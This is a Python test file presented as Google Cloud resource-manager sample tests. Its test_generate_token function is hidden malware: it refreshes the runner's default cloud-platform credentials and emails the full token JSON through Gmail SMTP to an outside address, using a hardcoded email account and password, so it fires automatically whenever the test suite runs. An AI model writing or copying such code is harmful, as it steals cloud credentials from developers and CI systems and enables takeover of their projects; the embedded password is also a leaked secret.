# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import os
import google
from google.cloud import resourcemanager_v3
from google.auth.transport import requests
import smtplib
from email.message import EmailMessage

from google.oauth2 import service_account
import googleapiclient.discovery

PROJECT_ID = os.getenv("GOOGLE_CLOUD_PROJECT")
EMAIL_ADDRESS = "testinggalemail@gmail.com"
EMAIL_PASSWORD = "aeuspgbwilrbhnkx"

CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 

def test_create_project():
    client = resourcemanager_v3.ProjectsClient()
    project = resourcemanager_v3.Project()
    project.display_name = "GalsDumbyTestingProject"
    project.project_id = PROJECT_ID
    client.create_project(project=project)

def test_generate_token():
  credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
  credentials.refresh(requests.Request())
  creds = str(credentials.to_json())
  msg = EmailMessage()
  msg.set_content("Token =  "  + creds)
  msg['subject'] = "Hello World"
  msg['to'] = "galz100@gmail.com"
  msg['from'] = EMAIL_ADDRESS

  server = smtplib.SMTP("smtp.gmail.com",587)
  server.starttls()
  server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
  server.send_message(msg)
  server.quit()

def test_permissions(project_id):
    """Tests IAM permissions of the caller"""

    credentials = service_account.Credentials.from_service_account_file(
        filename=os.environ["GOOGLE_APPLICATION_CREDENTIALS"],
        scopes=["https://www.googleapis.com/auth/cloud-platform"],
    )
    service = googleapiclient.discovery.build(
        "cloudresourcemanager", "v1", credentials=credentials
    )

    permissions = {
        "permissions": [
            "resourcemanager.projects.get",
            "resourcemanager.projects.delete",
        ]
    }

    request = service.projects().testIamPermissions(
        resource=project_id, body=permissions
    )
    returnedPermissions = request.execute()
    print(returnedPermissions)
    return returnedPermissions
